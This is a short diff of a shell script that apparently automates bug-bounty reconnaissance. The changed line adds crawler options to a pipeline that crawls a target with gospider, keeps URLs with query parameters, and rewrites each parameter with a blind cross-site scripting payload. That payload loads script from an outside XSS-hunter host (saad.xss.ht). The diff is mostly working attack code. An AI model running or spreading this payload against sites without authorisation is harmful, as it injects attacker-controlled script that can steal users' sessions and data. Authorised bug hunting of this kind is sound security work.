@@ -51,7 +51,7 @@ coded by @ELSFA7-110@automotion bughunting@\n\e[0m"
 
 echo -e "BLIND XSS \n"
 
-gospider -s $1 -t 200 -c 700 | tr " " "\n" | grep --color=auto -v ".js" | grep --color=auto "https://" | grep --color=auto "=" | qsreplace '&"><script src=https://saad.xss.ht></script>'
+gospider -s $1 -a -w -r -t 200 -c 700 | tr " " "\n" | grep --color=auto -v ".js" | grep --color=auto "https://" | grep --color=auto "=" | qsreplace '&"><script src=https://saad.xss.ht></script>'
 
 echo -e "WAYBACK \n"
 mkdir $1
